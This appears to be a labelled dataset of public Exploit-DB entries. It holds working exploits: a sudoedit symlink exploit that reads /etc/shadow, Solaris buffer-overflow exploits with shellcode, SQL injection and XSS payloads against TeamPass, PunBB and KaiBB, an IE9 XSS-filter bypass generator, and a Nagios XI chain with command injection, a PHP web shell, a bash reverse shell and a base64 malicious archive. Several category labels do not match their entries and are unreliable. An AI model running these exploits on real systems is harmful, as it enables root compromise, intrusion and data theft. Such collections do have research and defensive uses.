24606,"Sudo 1.6.8 - Information Disclosure // source: https://www.securityfocus.com/bid/11204/info  Sudo is reported prone to an information disclosure vulnerability.  This vulnerability presents itself when sudo is called with the '-e' option, or the 'sudoedit' command is invoked. In certain circumstances, attackers may access the contents of arbitrary files with superuser privileges.  Version 1.6.8 is reported susceptible to this vulnerability.  /*             Copyright ? Rosiello Security 2004                 http://www.rosiello.org                    sudoedit Exploit   SOFTWARE : sudoedit REFERENCE: http://www.sudo.ws/sudo/alerts/sudoedit.html DATE: 18/09/2004  Summary: A flaw in exists in sudo's -u option (aka sudoedit) in sudo version 1.6.8 that can give an attacker read permission to a file that would otherwise be unreadable.  Sudo versions affected: 1.6.8 only  Credit: Reznic Valery discovered the problem.  -----------------------------------------------------------  All the information that you can find in this software were published for educational and didactic purpose only. The author published this program under the condition that is not in the intention of the reader to use them in order to bring to himself or others a profit or to bring to others damage.  !Respect the law!  How do I use this code ?  To exploit sudoedit you have to open with it the file ""rosiello"" as shown in the example.  EXAMPLE SCENARIO:  1) Open two shells (i) and (ii); 2) (i)$sudoedit rosiello; 3) (ii)$./sudoedit-exploit /etc/shadow; 4) (i) close sudoedit.  The file ""rosiello"" is now a copy of ""/etc/shadow"".  AUTHOR : Angelo Rosiello CONTACT: angelo@rosiello.org  */  #include <stdio.h> #include <sys/stat.h> #include <string.h> #include <sys/types.h> #include <fcntl.h> #include <stdio.h> #include <dirent.h>   int main( int argc, char *argv[] ) {         char PATH[]=""/usr/tmp"";         char file[32];         DIR *tmp;         struct dirent *de;         tmp = opendir ( PATH );         int found = 0;          printf( ""Copyright ?? Rosiello Security 2004\n"" );         printf( ""http://www.rosiello.org\n"" );          if( argc!=2 )         {                 printf( ""USAGE: %s file\n"", argv[0] );                 return( 0 );         }           while ( (de = readdir ( tmp ))!= NULL )         {                 if ( (strstr(de->d_name, ""rosiello"") != NULL) )                 {                         if( strlen(de->d_name) > 24 ) return( 0 );                         sprintf( file, ""%s/%s"", PATH, (char *)de->d_name );                         remove( file );                         if( fork()!=0 )                         {                                 execl( ""/bin/ln"", ""ln"", ""-s"", argv[1], file, NULL );                         }                         wait( );                         printf( ""Now you can close sudoedit and reopen rosiello!\n"" );                         found=1;                         goto end;                  }          }         end:         closedir( tmp );          if( !found )                 printf( ""File Not Found!\n"" );         return( 0 );  }",information disclosure,1
37845,"Flash - Uninitialized Stack Variable MPD Parsing Memory Corruption Source: https://code.google.com/p/google-security-research/issues/detail?id=316&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  [Tracking for: https://code.google.com/p/chromium/issues/detail?id=472201]  Credit is to bilou, working with the Chromium Vulnerability Rewards Program.  --- VULNERABILITY DETAILS Loading a weird MPD file can corrupt flash player's memory.  VERSION Chrome version 41.0.2272.101, Flash 17.0.0.134 Operating System: Win 7 x64 SP1  REPRODUCTION CASE I'm ripping most of this from scarybeasts' sources. I'm sure he's ok with that =D.  ""To reproduce, host the attached SWF and other files on a web server (e.g. localhost) and load it like this:""  ""http://localhost/PlayManifest.swf?file=gen.mpd  ""To compile the .as file, I had to use special flags to flex:""  ""mxmlc -target-player 14.0 -swf-version 25 -static-link-runtime-shared-libraries ./PlayManifest.as"" ""(This also requires that you have v14.0 of playerglobals.swc installed. Any newer version should also be fine.)""   On Win7 x64 sp1 with Chrome 32 bit, crash like this: 6AA8B67C | 8B C3                    | mov eax,ebx                             | 6AA8B67E | E8 A1 05 00 00           | call pepflashplayer.6AA8BC24            | 6AA8B683 | EB A8                    | jmp pepflashplayer.6AA8B62D             | 6AA8B685 | 89 88 D0 00 00 00        | mov dword ptr ds:[eax+D0],ecx           |  // crash here, eax points somewhere in pepflashplayer.dll 6AA8B68B | 8B 88 88 00 00 00        | mov ecx,dword ptr ds:[eax+88]           | 6AA8B691 | 33 D2                    | xor edx,edx                             | 6AA8B693 | 3B CA                    | cmp ecx,edx                             | 6AA8B695 | 74 07                    | je pepflashplayer.6AA8B69E              | 6AA8B697 | 39 11                    | cmp dword ptr ds:[ecx],edx              | 6AA8B699 | 0F 95 C1                 | setne cl                                |   At first sight this looks to be an uninitialized stack variable but I might be wrong. ---  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37845.zip",corrupt flash player's memory,1
39559,"TeamPass 2.1.24 - Multiple Vulnerabilities Affected Product:    TeamPass Vulnerability Type:  	Multiple XSS,CSRF, SQL injections Fixed in Version:	2.1.25 (https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.25.0) Vendor Website:      	http://www.teampass.net Software Link: : 	https://github.com/nilsteampassnet/TeamPass Affected Version:	2.1.24 and prior  Vulnerable software (including source) : https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.24.4 Google Dork: intitle:""Teampass"" + inurl:index.php?page=items Tested on: Ubuntu Remote Exploitable:  Yes Reported to vendor:  30 december 2015 Disclosed to public: 14 March 2016 Release mode:        Responsible Disclosure CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  CVE-2015-7563 TeamPass 2.1.24 CSRF  CVE-2015-7564 TeamPass 2.1.24 SQL Injection  Credits:              Vincent Malguy   Description : TeamPass is a Passwords Manager dedicated for managing passwords in a collaborative way on any server Apache, MySQL and PHP. It is especially designed to provide passwords access security for allowed people. This makes TeamPass really useful in a Business/Enterprise environment and will provide to IT or Team Manager a powerful and easy tool for customizing passwords access depending on the user’s role.  Copyright (c) 2009-2015, Nils Laumaillé  ********************* CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  ********************* When displaying the detail of an item (a password entry), the ""label"" value is display using the stripslashes() sanitization function. This function does not efficiently  prevent XSS. POC of a persistant XSS : add  item with label : $str = ""' onclick='javascript:alert(""XSS found"");' alt='"";echo ""<a href='"". strip_tags($str) .""'></a>""; This xss will be trigger each time a user click on this item.  As item can be share, there is a way for a user to trick an admin to trigger this xss. fix in commit cd112ea (see https://github.com/nilsteampassnet/TeamPass/pull/1140)  POC of a persistant XSS :  Add a new role with name  : <script>alert(""XSS"");</script>  This xss will be trigger in many admin pages Fix in commit : 3f0a6c9 & e29cd54 & 295cada & 2c8a829 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)  ********************* CVE-2015-7563 TeamPass 2.1.24 CSRF  ********************* Lack of anti-CSRF token lead to security vulnerabilities where an attacker can trick a authenticated user to do some unwanted action on his behalf :  <form action=""http://<teampass host>/sources/main.queries.php"" method=""post"">     <select name=""type"">     <option value=""increase_session_time »>will add 1 hour timeout to the user session</option> </select>     <input type=submit>   </form>     recommanded fix: add anti-CSRF token.  ********************* CVE-2015-7564 TeamPass 2.1.24 SQL Injections   ********************* SQL injection has been found in item.query.php parameter id with type set to action_on_quick_icon. Sqlmap output  : --- Parameter: id (POST) Type: boolean-based blind Title: MySQL >= 5.0 boolean-based blind - Parameter replace Payload: type=action_on_quick_icon&id=(SELECT (CASE WHEN (6144=6144) THEN 6144 ELSE 6144*(SELECT 6144 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&action=1  —  fix in commit 795256f (see https://github.com/nilsteampassnet/TeamPass/pull/1140)   SQL injections has been found in view.query.php in parameters order and direction with type set to connections_logs, errors_logs or access_logs . Note that direction need to be prefixed by "", ""  in order to be exploitable Sqlmap output  for connections_logs: --- Parameter: order (POST)     Type: boolean-based blind     Title: MySQL >= 5.0 boolean-based blind - Parameter replace     Payload: type=connections_logs&order=(SELECT (CASE WHEN (6688=6688) THEN 6688 ELSE 6688*(SELECT 6688 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&direction=DESC      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)     Payload: type=connections_logs&order=date AND (SELECT * FROM (SELECT(SLEEP(5)))vhPw)&direction=DESC —  --- Parameter: direction (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: type=errors_logs&order=date&direction=,  (SELECT (CASE WHEN (1739=1739) THEN 1739 ELSE 1739*(SELECT 1739 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)) — fix commit 86719e0 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)",information disclosure,1
28870,"PunBB 1.x - SQL Injection source: https://www.securityfocus.com/bid/20786/info  PunBB is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may exploit these issues to execute arbitrary script code in the context of the webserver process or to pass malicious input to database queries, resulting in the modification of query logic or other attacks. Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  PunBB 1.2.13 and prior versions are vulnerable; other versions may also be affected.  http://www.example.com/search.php?action=search&keywords=hello&author=&forum=-1&search_in=all&sort_by=0&sort_dir=DESC&show_as=topics&search=1&result_list[< UNION SQL QUERY >/*]&1763905137=1&1121320991=1",fails to sufficiently sanitize user-supplied data,1
5338,"ChilkatHttp ActiveX 2.3 - Arbitrary Files Overwrite --------------------------------------------------------------------  ChilkatHttp ActiveX 2.3 Arbitrary Files Overwrite  url: www.chilkatsoft.com   Author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org   This was written for educational purpose. Use it at your own risk.  Author will be not responsible for any damage. -------------------------------------------------------------------- <object classid='clsid:B973393F-27C7-4781-877D-8626AAEDF119' id='test'></object>  <input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>  <script language='vbscript'>  Sub tryMe   test.SaveLastError ""c:\windows\system_.ini""   MsgBox ""Exploit completed!""  End Sub </script>  # milw0rm.com [2008-04-01]",code execution,1
21193,"DeleGate 7.7.1 - Cross-Site Scripting source: https://www.securityfocus.com/bid/3749/info  DeleGate is a proxy server which runs on Linux , Unix, Microsoft Windows and OS/2 platforms. It is capable of translating a number of protocols(HTTP, FTP, NNTP, POP, Telnet, etc.) between client and server.  DeleGate is prone to cross-site scripting attacks. HTML tags are not filtered from links to error pages. As a result, it is possible for an attacker to insert malicious script code into a link to a site running DeleGate. When a web user clicks the link an error page will be displayed and the script code will be executed on the web user in the context of the site running DeleGate.  Such an attack may be used to steal a legitimate user's cookie-based authentication credentials.   http://IP_Address_of_DeleGate/<script>alert(""aaa"");</script>",insert malicious script code into a link to a site running DeleGate,1
19648,"Solaris 7.0 - CDE dtmail/mailtool Buffer Overflow // source: https://www.securityfocus.com/bid/832/info  here are three buffer overflow vulnerabilities in the CDE mail utilities, all of which are installed sgid mail by default.  The first is exploited through overrunning a buffer in the Content-Type: field, which would look something like this:  Content-Type: image/aaaaaaaa long 'a' aaaaaa; name=""test.gif""  mailtool will overflow when email is selected which has a content-type field like that. It may be possible for an attacker to obtain root priviliges if shellcode is written appropriately and root selects the malicious email message.  The second vulnerability is in dtmail, which will crash (and possibly execute arbitrary code) if a long paramater is passed argumenting the -f command-line option.  The third is in mailpr, which is vulnerable to a long -f paramater as well.  The most basic consequence of these being exploited is a compromise of local email, since all mail data is set mode 660, read and write permissions granted for members of group mail.  As of November 30, 1999, Solaris 7 is the only known vulnerable platform.  ex_mailtool.c ----- /*=============================================================================    Solaris mailtool exploit for Solaris7 Intel Edition    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN  (shadowpenguin@backsection.net)    Descripton:      Local user can read/write any user's mailbox    Usage:      setenv DISPLAY yourdisply      gcc ex_mailtool.c      ./a.out /var/mail/[any user]      - Choice ""exploit@localhost"" mail   ============================================================================= */  #include <stdio.h>  #define FAKEADR 96 #define FAKEOFS 0x1000 #define RETADR  84 #define RETOFS  0x1224 #define EXPADR  300 #define NOP     0x90 #define MAXBUF  2000 #define DIR     ""/usr/openwin/bin""  #define HEAD \ ""From exploit@localhost Fri Nov 26 00:01 JST 1999\n""\ ""Content-Type: multipart/mixed; ""\ ""boundary=\""VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==\""\n""\ ""Content-Length: 340\n\n""\ ""--VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==\n""\ ""Content-Type: image/%s; name=\""test.gif\""\n""\ ""Content-Disposition: attachment;\n""\ "" filename=\""test.gif\""\n""\ ""Content-Transfer-Encoding: base64\n\n""\ ""IA==\n\n""\ ""--VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==--\n\n""  unsigned long get_sp(void) {   __asm__("" movl %esp,%eax ""); }  char exploit_code[2000] = ""\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"" ""\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"" ""\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"" ""\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"" ""\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"" ""\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"" ""\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"" ""\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"" ""\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"" ""\x04\xe8\xc9\xff\xff\xff/tmp/xx"";  main(int argc, char *argv[]) {     static char     buf[MAXBUF];     FILE        *fp;     unsigned int    i,ip,sp;      if (argc!=2){         printf(""usage : %s mailbox\n"",argv[0]);         exit(1);     }     putenv(""LANG="");     sp=get_sp();     system(""ln -s /bin/ksh /tmp/xx"");     printf(""esp  = 0x%x\n"",sp);     memset(buf,NOP,MAXBUF);     buf[MAXBUF-1]=0;      ip=sp-FAKEOFS;     printf(""fake = 0x%x\n"",ip);     buf[FAKEADR  ]=ip&0xff;     buf[FAKEADR+1]=(ip>>8)&0xff;     buf[FAKEADR+2]=(ip>>16)&0xff;     buf[FAKEADR+3]=(ip>>24)&0xff;     ip=sp-RETOFS;     printf(""eip  = 0x%x\n"",ip);     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=(ip>>24)&0xff;      strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));      if ((fp=fopen(argv[1],""ab""))==NULL){         printf(""Can not write '%s'\n"",argv[1]);         exit(1);     }     fprintf(fp,HEAD,buf);     fclose(fp);     printf(""Exploit mail has been added.\n"");     printf(""Choice \""exploit@localhost\"" mail.\n"");     sprintf(buf,""cd %s; mailtool"",DIR);     system(buf); }   ex_mailtool.c ----- /*=============================================================================    Solaris dtmailpr exploit for Solaris7 Intel Edition    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN  (shadowpenguin@backsection.net)    Descripton:      Local user can read/write any user's mailbox   ============================================================================= */  #include <stdio.h>  #define RETADR  1266 #define RETOFS  0x1d88 #define EXPADR  300 #define NOP 0x90 #define MAXBUF  2000  unsigned long get_sp(void) {   __asm__("" movl %esp,%eax ""); }  char exploit_code[2000] = ""\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"" ""\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"" ""\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"" ""\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"" ""\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"" ""\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"" ""\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"" ""\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"" ""\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"" ""\x04\xe8\xc9\xff\xff\xff/tmp/xx"";  main() {     static char     buf[MAXBUF+1000];     FILE        *fp;     unsigned int    i,ip,sp;      putenv(""LANG="");     sp=get_sp();     system(""ln -s /bin/ksh /tmp/xx"");     printf(""esp  = 0x%x\n"",sp);     memset(buf,NOP,MAXBUF);     ip=sp-RETOFS;     printf(""eip  = 0x%x\n"",ip);     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=(ip>>24)&0xff;     strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));     buf[MAXBUF-1]=0;     execl(""/usr/dt/bin/dtmailpr"",""dtmailpr"",""-f"",buf,0); }",obtain root priviliges if shellcode is written appropriately and root selects the malicious email message,1
22100,"Microsoft Internet Explorer 9 - Cross-Site Scripting Filter Bypass ################################################# Internet Explorer 9 XSS Filter Bypass #################################################   Discovered by: Jean Pascal Pereira <pereira@secbiz.de>   Vendor information:   ""Internet Explorer (formerly Microsoft Internet Explorer and Windows Internet Explorer, commonly   abbreviated IE or MSIE) is a series of graphical web browsers developed by Microsoft and included as part of the Microsoft   Windows line of operating systems, starting in 1995. It was first released as part of the add-on package Plus! for Windows 95   that year. Later versions were available as free downloads, or in service packs, and included in the OEM service releases of   Windows 95 and later versions of Windows..""   Vendor URI: http://www.microsoft.com   #################################################   Issue: Cross Site Scripting Filter Bypass   -------------------------------------  Description:  The Internet Explorer 9 offers a feature to eliminate suspicious pattern passed to the website by a   parameter.  For example, we have the following script:  -------------------------------------  <?php  echo $_GET['a'];  ?>  -------------------------------------  Let's call it ""blah.php"". Now we access the blah.php by using Internet Explorer 9 and try to execute a   malicious string:  http://localhost/ieb/blah.php?a=<script>alert(1)</script>  After this, we receive the message ""Internet Explorer has modified this page to help prevent cross-  site scripting"".  The JavaScript won't be executed.  -------------------------------------   Proof Of Concept:   This trick may be known to some of you. Internet Explorer allows stripping tags by inserting   nullbytes.  For example, the following string will be executed:  3C 73 00 63 72 69 70 74 3E 61 6C 65 72 74 28 31 29 3C 2F 73 00 63 72 69 70 74 3E  Which is actually ""<s[NULL]cript>alert(1)</s[NULL]cript>"".  However, we won't be able to insert the nullbytes directly in the URI. The following example won't   work:  http://localhost/ieb/blah.php?a=<s%00cript>alert(1)</s%00cript>  But there is still another possibility. Grab a hex editor and create a file looking like the example   given below:  <a href='http://localhost/ieb/blah.php?a=<s[NULL]cript>alert(1)</s[NULL]cript>'>Clickme</a>  If you open the file and click the provided link, the script will be executed.   -------------------------------------  Exploit (for the lazy folks):  -------------------------------------  #!/usr/bin/perl  use strict; use warnings;  # Internet Explorer 9 XSS Filter Bypass Generator # Credit: Jean Pascal Pereira <pereira[at]secbiz.de> # http://0xffe4.org  my $target  = shift || die(""No target defined""); my $payload = shift || die(""No payload defined""); my $lnk_txt = shift || ""Click me :)"";  open(OUT, "">:raw"", ""out.html"");  print OUT ""\x3C\x61\x20\x68\x72\x65\x66\x3D\x27"";  print OUT $target;  print OUT ""\x3C\x73\x00\x63\x72\x69\x70\x74\x3E"";  print OUT $payload;  print OUT ""\x3C\x2F\x73\x00\x63\x72\x69\x70\x74\x3E\x27\x3E"";  print OUT $lnk_txt;  print OUT ""\x3C\x2F\x61\x3E"";  close(OUT);  -------------------------------------  Example usage is:  iefilter.pl http://www.example.com?var= alert(1)  -------------------------------------  Note:  Exploitation via <a href=""ja[NULL]vascript:... links is also possible.  -------------------------------------   Solution:   Currently, no solution is available for this issue.   -------------------------------------   #################################################  < http://0xffe4.org >",denial of service,1
17952,"KaiBB 2.0.1 - SQL Injection Advisory:              		KaiBB 2.0.1 XSS and SQL Injection vulnerabilities Advisory ID:           	SSCHADV2011-027 Author:                		Stefan Schurtz Affected Software:  	Successfully tested on KaiBB 2.0.1 Vendor URL:          	http://code.google.com/p/kaibb/ Vendor Status:       	informed CVE-ID:                	 	-  ========================== Vulnerability Description: ==========================  KaiBB 2.0.1 is prone to XSS and SQL Injection vulnerabilities  ================== Technical Details: ==================  Cross-site Scripting  http://<target>/kaibb/?'</script><script>alert(document.cookie)</script> http://<target>/kaibb/index.php?'</script><script>alert(document.cookie)</script>  SQL Injection  http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL AND 'a'='a http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, version(), NULL, NULL, NULL, NULL, NULL AND 'a'='a http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, user(), NULL, NULL, NULL, NULL, NULL AND 'a'='a  ========= Solution: =========  -  ==================== Disclosure Timeline: ====================  08-Oct-2011 - informed developers 08-Oct-2011 - release date of this security advisory  ======== Credits: ========  Vulnerability found and advisory written by Stefan Schurtz.  =========== References: ===========  http://code.google.com/p/kaibb/ http://code.google.com/p/kaibb/issues/detail?id=2 http://www.rul3z.de/advisories/SSCHADV2011-027.txt",information disclosure,1
39899,"Nagios XI 5.2.7 - Multiple Vulnerabilities (    , )     (,   .   '.' ) ('.    ',    ). , ('.   ( ) (   (_,) .'), ) _ _,  /  _____/  / _  \    ____  ____   _____  \____  \==/ /_\  \ _/ ___\/  _ \ /     \  /       \/   |    \\  \__(  <_> )  Y Y  \ /______  /\___|__  / \___  >____/|__|_|  /         \/         \/.-.    \/         \/:wq                     (x.0)                   '=.|w|.='                   _=''""''=.                  presents..  Nagios XI Multiple Vulnerabilities Affected versions: Nagios XI <= 5.2.7  PDF: http://www.security-assessment.com/files/documents/advisory/NagiosXI-Advisory.pdf  +-----------+ |Description| +-----------+ The Nagios XI application is affected by multiple security vulnerabilities, including unauthenticated SQL injection and authentication bypass, arbitrary code execution via command injection, privilege escalation, server-side request forgery and account hijacking.  These vulnerabilities can be chained together to obtain unauthenticated remote code execution as the root user.  +------------+ |Exploitation| +------------+ ==SQL Injection== The ‘host’ and ‘service’ GET parameters in the ‘nagiosim.php’ page are vulnerable to SQL injection via error-based payloads. An attacker can exploit this vulnerability to retrieve sensitive information from the application’s MySQL database such as the administrative users’ password hash (unsalted MD5) or the token used to authenticate to the Nagios XI REST API. This security issue is aggravated by the fact that an attacker can directly browse to the vulnerable page and exploit the vulnerability without providing a valid session cookie.  [POC - DUMP ADMIN API TOKEN] GET /nagiosxi/includes/components/nagiosim/nagiosim.php?mode=resolve&host=a&service='+AND+ (SELECT+1+FROM(SELECT+COUNT(*),CONCAT('|APIKEY|',(SELECT+MID((IFNULL(CAST(backend_ticket+AS +CHAR),0x20)),1,54)+FROM+xi_users+WHERE+user_id%3d1+LIMIT+0,1),'|APIKEY|',FLOOR(RAND(0)*2)) x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+OR+' HTTP/1.1  The API token can be reused to bypass authentication either by creating a user via the REST API or through the Rapid Response functionality as shown below.  [POC- BYPASS AUTHENTICATION THROUGH RAPID RESPONSE FUNCTIONALITY] // uid == <user_id>-<object_id>-<MD5(api token)>, object id value doesn't matter GET /nagiosxi/rr.php?uid=1-b-<hash> HTTP/1.1  ==Command Injection== Multiple command injection vulnerabilities exist in the Nagios XI web interface due to unescaped user input being passed to shell functions as an argument. This issues can be exploited to inject arbitrary shell commands and obtain remote code execution in the context of the 'apache' user.  URL         => GET /nagiosxi/includes/components/nagiosim/nagiosim.php?mode=update&token=<api token>&incident_id=<valid incident id>&title=<PAYLOAD>&status=<any value> PARAMETER   => title POC PAYLOAD => title'; touch /tmp/FILE; echo '  URL         => GET /nagiosxi/includes/components/perfdata/graphApi.php?host=<any monitored host IP>&start=<PAYLOAD>&end=<PAYLOAD> PARAMETERS  => start, end POC PAYLOAD => 1; touch /tmp/FILE;  ==Privilege Escalation== The Nagios XI default sudoers configuration can be abused to elevate privileges to root due to an insecure implementation of the application’s component upload functionality. The ‘apache’ user can run the getprofile.sh script with root privileges without being prompted for a password. The getprofile.sh script is part of the Profile component along with the following files:  - profile.php, the PHP script that outputs the system information. - profile.inc.php, a PHP include file with required functionality for profile.php.  An attacker can backdoor the profile.php file with a function to execute arbitrary shell commands (e.g. <?php system($_GET['cmd']); ?> ), replace the getprofile.sh file with a malicious payload (e.g. “#!/bin/bash bash –i >& /dev/tcp/<IP>/<PORT> 0>&1”) and finally create a ‘profile.zip’ archive containing the malicious component files. Once uploaded, the application will unzip the component archive and overwrite the existing profile directory and its files, including getprofile.sh.  [POC - MALICIOUS 'profile.zip' COMPONENT ARCHIVE] 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 